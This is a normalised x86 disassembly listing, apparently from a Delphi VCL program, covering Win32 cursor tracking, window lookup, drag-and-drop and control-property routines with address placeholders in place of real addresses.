mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_4383b0
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_43a0b4
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_4383b0
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458464
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_442784
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_4383ec
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403394
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_4428b0
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_4427c8
jmp r-xdata
mov eax [ rw-data ]
call sub_442924
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458464
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_43a0b4
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403394
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403394
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407c90
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_438750
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43797c
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4427c8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_438480
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_4388c0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_438a65
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403394
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403394
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_437c84
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_438750
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_437b6c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_440d58
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412bb8
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_43a088
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_412bb8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_438a84
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403394
mov ebx eax
sub_438af8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_438dc4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_438d52
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4379c4
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403348
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_438a84
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_4383b0
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_442924
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438d59
mov eax [ rw-data ]
call sub_403198
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_451710
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_43b724
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43827c
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_45537c
sub_438d59
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403324
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403198
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_403324
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
sub_438de8
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4373fc
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_438e1c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_438de8
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_43a0b4
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_43e644
test eax eax
je r-xdata
mov esi eax
sub_438e64
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_413eec
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx ] eax
sub_438e8c
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_4141dc
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403198
xor eax eax
mov [ ebx ] eax
sub_438eac
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_438edc
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_414404
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_438f8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414468
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_438f65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_439118
call sub_4039d0
call sub_4039d0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414098
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41dbfc
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_438f98
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_414404
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_439036
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43903d
mov eax [ rw-data ]
call sub_414468
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43900e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_439118
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41dc58
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414098
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41dbfc
test al al
je r-xdata
sub_439044
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_439118
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d82c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_439070
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dddc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41dde0
mov eax [ ebp - 0x4 ]
call sub_439164
mov eax [ rw-data ]
call sub_414404
mov ebx eax
xor eax eax
push ebp
push sub_4390f5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413eec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414468
retn
call sub_438edc
sub_439118
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41dde0
mov edx ebx
mov eax [ rw-data ]
call sub_414418
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_439164
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43abb4
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_439190
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4391cc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414738
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_439214
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_4392d0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43939d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4393a4
lea eax [ ebp - 0x1c ]
call sub_403ee8
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403394
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_449e8c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408da0
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403f3c
sub_4393c0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_439427
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_446aa0
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43a570
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov edx [ eax + 0x64 ]
pop eax
call sub_4042f4
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43942e
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov al 0x1
sub_439434
push ebx
mov ebx eax
mov eax ebx
call sub_446ac8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_439468
push ebx
mov ebx eax
mov eax ebx
call sub_446b18
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4042f4
je r-xdata
mov al 0x1
pop ebx
retn
sub_4394a0
push ebx
mov ebx eax
mov eax ebx
call sub_446b54
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4394d4
push ebx
mov ebx eax
mov eax ebx
call sub_41a340
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4394fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43a5a0
sub_43951c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43953c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403f3c
sub_439560
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43a490
sub_439580
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_4395ac
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4042f4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_439610
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_439eec
sub_439630
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_439ed8
sub_439650
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_439670
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a50
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc50
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43a620
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439190
mov esi eax
